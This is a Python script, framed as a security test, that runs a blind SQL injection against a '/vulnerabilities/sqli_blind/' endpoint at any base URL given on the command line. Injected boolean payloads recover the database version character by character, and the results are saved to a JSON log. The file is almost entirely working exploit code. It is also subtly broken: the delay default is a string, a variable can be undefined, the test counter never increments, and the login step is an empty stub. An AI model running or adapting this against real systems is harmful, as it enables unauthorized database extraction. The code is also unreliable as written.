import requests
from bs4 import BeautifulSoup
from datetime import datetime
from pathlib import Path
import os
import sys
import json
import time

# Setup directories and session
logs_dir = Path('logs')
logs_dir.mkdir(exist_ok=True)
session = requests.Session()

if len(sys.argv) > 2:
    base_url = sys.argv[1]
    request_rate = sys.argv[2]
else:
    print("Base URL and/or request rate were not provided.")
    sys.exit(1)

# Map request rate to a specific time interval
delays = {'low': 7, 'medium': 2, 'high': 0.5}
delay = delays.get(request_rate, 'medium')  # Default to 'medium' if rate is unrecognized

sqli_blind_url = f"{base_url}/vulnerabilities/sqli_blind/"

def login_and_setup_security():
    # Assuming login is required; adjust as necessary
    pass

def blind_sql_injection_attack():
    total_tests = 0
    tests_passed = 0
    tests_failed = 0
    details = []
    version_number = ''

    # Example of payload to find out the length of the version number
    for i in range(1, 10):
        payload = f"1' AND (SELECT LENGTH(version()) = {i}) AND '1' = '1"
        response = session.get(sqli_blind_url, params={'id': payload})
        if time_delayed_response(response):
            version_length = i
            print(f"Detected version number length: {version_length}")
            break

    # Fetch each character of the version number
    for i in range(1, version_length + 1):
        for ascii_code in range(32, 127):  # printable ASCII range
            payload = f"1' AND (SELECT ASCII(SUBSTRING(version(), {i}, 1)) = {ascii_code}) AND '1' = '1"
            response = session.get(sqli_blind_url, params={'id': payload})
            if time_delayed_response(response):
                version_number += chr(ascii_code)
                print(f"Found {i} character of version: {chr(ascii_code)}")
                break

    if version_number:
        tests_passed += 1
        result_status = "PASSED - Successfully retrieved database version"
    else:
        tests_failed += 1
        result_status = "FAILED - Could not retrieve database version"
    
    time.sleep(delay)
    
    details.append({
        "test_type": "Blind SQL Injection",
        "attack_detail": "Database version extraction",
        "extracted_version": version_number,
        "status": result_status
    })

    # Log the results
    script_name = os.path.splitext(os.path.basename(__file__))[0]
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    file_name = f"results_{script_name}_{timestamp}.json"
    results_file = logs_dir / file_name
    result_summary = {
        'date_time': timestamp,
        'base_url': base_url,
        'total_tests': total_tests,
        'tests_passed': tests_passed,
        'tests_failed': tests_failed,
        'tested_url': sqli_blind_url,
        'details': details
    }
    with open(results_file, 'w') as f:
        json.dump(result_summary, f, indent=4)
    print(f"Results saved to {results_file}")

def time_delayed_response(response):
    # Adjust this function to your testing setup; typically might involve checking response times or status codes
    # For demo purposes, let's assume a delay in response or a specific text appears in the response
    return "successful" in response.text.lower()

if __name__ == "__main__":
    login_and_setup_security()
    blind_sql_injection_attack()